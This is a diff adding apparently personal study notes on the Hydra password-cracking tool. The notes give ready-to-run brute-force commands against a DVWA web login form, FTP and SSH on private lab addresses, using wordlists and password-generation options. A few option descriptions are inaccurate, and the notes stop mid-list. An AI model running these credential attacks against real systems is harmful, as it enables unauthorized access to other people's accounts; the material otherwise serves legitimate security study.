@@ -1,0 +1,126 @@
+HYDRA --> password cracking tool
+
+         <------- HYDRA VARIOUS USAGES ------->
+
+
+1. Get the Web Form Parameters
+================================>
+
+The key parameters we must identify are the:
+
+	1.	IP Address of the website
+	2.	URL
+	3.	type of form
+	4.	field containing the username
+	5.	field containing the password
+	6.	failure message
+
+
+	SYNTAX ->
+hydra -L <username list> -p <password list> <IP Address> <form parameters> <failed login message>
+
+
+Ex :->
+
+hydra -L <wordlist> -P<password list>
+192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
+
+
+If we have txt file then we can use capital word "L" & "P" for user lists and passwords lists respectively
+
+If we have either user information like username -> admin or if have password name -> password then we can use either small word "l" & "p"
+for username [l] and password [p] respectively
+
+ex:
+hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
+
+where admin is i know is username so i use small word "l" but i don't know password so used password list to bruteforce with P capital word
+
+
+http-post-form <---- indicates the type of form
+
+^USER^ <----  tells Hydra to use the username or list in the field
+
+^PASS^ <----  tells Hydra to use the password list supplied
+
+
+Login <---   indicates to Hydra the login failed message
+
+Login failed <--- is the login failure message that the form returned
+
+-V <----  is for verbose output showing every attempt
+
+ALSO CAN USE -> S=successful message instead of Login Failed like this ->
+
+hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&S=success message" -V
+
+
+Also sometime webserver blocks our request for failure reason so use 
+w switch
+
+like
+
+
+hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" 
+-w 10 -V
+
+
+
+
+
+
+FOR Wordlists either we can make our own wordlists or can choose available wordlists preinstall in kali like /usr/sharewordlists/rockyou.txt or seclists
+
+to generate our own wordlists we can use either -> cewl or crunch
+
+
+2 Crack ftp passwords with thc hydra
+===============>
+
+hydra -t 1 -l admin -P /root/Desktop/password.lst -vV 192.168.1.1 ftp
+
+The t option tells how many parallel threads hydra should create. In this case I used 1 because many routers cannot handle multiple connections and would freeze or hang for a shortwhile.
+
+
+Always good idea to use john to make better wordlists if we made our own wordlists
+
+3. Brute Force SSH Password using HYDRA 
+========================================>
+
+hydra -l (USER TO LOG IN AS) -x 4:10:aA 192.168.8.101 ssh
+
+Breaking down the command:
+
+-l is the user to log in as.
+
+-x this is the password generating parameters. 4:10:aA means the password is at minimum 4 characters, and maximum 10, and that it can contain lowercase a-z and uppercase a-z. 
+
+				OR
+
+
+hydra –l root –P password.txt ip target -t 4 ssh > fileforsaving
+
+
+-t specifies the number of threads used
+
+
+
+ALSO Sometime ssh not running on port 22 as system administrator might change. So change port number use "S" option
+
+hydra -s 9 -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh
+
+where -s 9 <- switch to port 9 number instead of port 22
+
+
+ALSO
+-e nsr
+
+The -e flag gives you more options to test with. Sometimes users have passwords that are so amazingly bad that you have to account for them outside the normal scope of your wordlist. The letters nsr after the -e flag correspond to more ways to test. n stands for "null," meaning that Hydra will test for a user not having a password. s stands for "same." Hydra will test the same password as the username, when using s. r stands for "reverse." If a user thought that they were clever and reversed their bad password, Hydra will catch that too.
+
+
+hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 
+-e nsr ssh
+
+Reference -> https://linuxconfig.org/ssh-password-testing-with-hydra-on-kali-linux
+
+4. 
